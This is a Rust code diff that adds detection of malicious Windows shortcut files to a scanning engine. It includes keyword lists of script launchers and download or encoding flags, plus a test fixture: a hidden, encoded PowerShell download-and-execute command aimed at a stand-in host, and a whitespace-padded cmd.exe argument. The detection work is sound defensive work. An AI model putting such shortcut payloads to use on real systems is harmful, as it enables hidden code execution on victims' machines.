@@ -50,6 +50,7 @@ pub enum ContentType {
     SevenZip,
     Rar,
     OleCompound,
+    Lnk,
     Elf,
     MachO,
     Binary,
@@ -516,6 +517,7 @@ impl ScanEngine {
                 analyze_script(bytes, self.config.max_script_sample_bytes, &mut evidence)
             }
             ContentType::Pdf => analyze_pdf(bytes, &mut evidence),
+            ContentType::Lnk => analyze_lnk(bytes, &mut evidence),
             _ => {
                 if entropy >= HIGH_ENTROPY_THRESHOLD && bytes.len() >= MIN_SECTION_ENTROPY_BYTES {
                     push_evidence(
@@ -650,6 +652,9 @@ fn classify_content(bytes: &[u8], text_limit: usize) -> ContentType {
     }
     if bytes.starts_with(b"%PDF-") {
         return ContentType::Pdf;
+    }
+    if crate::lnk::is_shortcut(bytes) {
+        return ContentType::Lnk;
     }
     if bytes.starts_with(b"PK\x03\x04")
         || bytes.starts_with(b"PK\x05\x06")
@@ -1307,6 +1312,110 @@ fn analyze_script(bytes: &[u8], sample_limit: usize, evidence: &mut Vec<Evidence
     }
 }
 
+/// A shortcut is judged by what it launches: a script interpreter or downloader given something
+/// to fetch, decode or run, or arguments padded out so the real command is off-screen in the
+/// properties dialog. A shortcut to a document or program with plain arguments is ordinary.
+fn analyze_lnk(bytes: &[u8], evidence: &mut Vec<Evidence>) {
+    const LAUNCHERS: &[&str] = &[
+        "cmd.exe",
+        "powershell",
+        "pwsh",
+        "mshta",
+        "wscript",
+        "cscript",
+        "rundll32",
+        "regsvr32",
+        "forfiles",
+        "certutil",
+        "bitsadmin",
+        "curl",
+    ];
+    const FETCH: &[&str] = &[
+        "http://",
+        "https://",
+        "ftp://",
+        "downloadstring",
+        "downloadfile",
+        "invoke-webrequest",
+        "iwr ",
+        "-urlcache",
+        "bitsadmin",
+        "\\\\",
+    ];
+    const DECODE: &[&str] = &[
+        "-enc ",
+        "-e ",
+        "-ec ",
+        "-encodedcommand",
+        "frombase64string",
+        "-windowstyle hidden",
+        "-w hidden",
+    ];
+    const RUN: &[&str] = &[
+        "iex",
+        "invoke-expression",
+        "start-process",
+        "mshta",
+        "wscript",
+    ];
+    const PADDED_ARGUMENTS: usize = 1024;
+    const WHITESPACE_RUN: usize = 120;
+
+    let Some(shortcut) = crate::lnk::parse(bytes) else {
+        return;
+    };
+    let target = shortcut.target.to_ascii_lowercase();
+    let arguments = shortcut.arguments.to_ascii_lowercase();
+    if !contains_any(&target, LAUNCHERS) {
+        return;
+    }
+
+    let fetches = contains_any(&arguments, FETCH);
+    let decodes = contains_any(&arguments, DECODE);
+    let runs = contains_any(&arguments, RUN);
+    if fetches && (decodes || runs) || decodes && runs {
+        push_evidence(
+            evidence,
+            "lnk.script_launch",
+            EvidenceSeverity::High,
+            45,
+            format!(
+                "shortcut starts {} with arguments that fetch, decode or run code",
+                shortcut.target
+            ),
+        );
+        if shortcut.minimized {
+            push_evidence(
+                evidence,
+                "lnk.hidden_window",
+                EvidenceSeverity::Low,
+                10,
+                "shortcut starts that program with its window minimised".to_owned(),
+            );
+        }
+    }
+
+    let mut run = 0usize;
+    let mut longest = 0usize;
+    for character in shortcut.arguments.chars() {
+        if character.is_whitespace() {
+            run += 1;
+            longest = longest.max(run);
+        } else {
+            run = 0;
+        }
+    }
+    if shortcut.arguments.len() >= PADDED_ARGUMENTS && longest >= WHITESPACE_RUN {
+        push_evidence(
+            evidence,
+            "lnk.padded_arguments",
+            EvidenceSeverity::Medium,
+            30,
+            format!("shortcut arguments are {longest} blank characters padded, hiding the command"),
+        );
+    }
+}
+
 /// Whether some occurrence of one of `left` is within `window` bytes of one of `right`.
 fn near(haystack: &str, left: &[&str], right: &[&str], window: usize) -> bool {
     const MOST_POSITIONS: usize = 200_000;
@@ -1873,6 +1982,49 @@ mod tests {
             .evidence
             .iter()
             .any(|item| item.code == "pe.malformed"));
+    }
+
+    #[test]
+    fn shortcuts_are_judged_by_what_they_launch() {
+        let engine = ScanEngine::default();
+        let hostile = crate::lnk::build(
+            r"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "-w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA https://evil.example/a",
+            7,
+        );
+        let report = engine.scan_bytes(&hostile);
+        assert_eq!(report.content_type, ContentType::Lnk);
+        assert_eq!(report.verdict, Verdict::Suspicious);
+        for code in ["lnk.script_launch", "lnk.hidden_window"] {
+            assert!(
+                report.evidence.iter().any(|item| item.code == code),
+                "{code}"
+            );
+        }
+
+        let padded = crate::lnk::build(
+            r"C:\Windows\System32\cmd.exe",
+            &format!("/c        {}calc.exe", " ".repeat(1500)),
+            1,
+        );
+        let report = engine.scan_bytes(&padded);
+        assert!(report
+            .evidence
+            .iter()
+            .any(|item| item.code == "lnk.padded_arguments"));
+
+        for (target, arguments) in [
+            (r"C:\Windows\System32\cmd.exe", "/k cd /d C:\\Users"),
+            (
+                r"C:\Program Files\App\app.exe",
+                "--url https://example.com -enc",
+            ),
+            (r"C:\Windows\notepad.exe", ""),
+        ] {
+            let report = engine.scan_bytes(&crate::lnk::build(target, arguments, 1));
+            assert_eq!(report.verdict, Verdict::Clean, "{target} {arguments}");
+            assert!(report.evidence.is_empty(), "{target} {arguments}");
+        }
     }
 
     #[test]
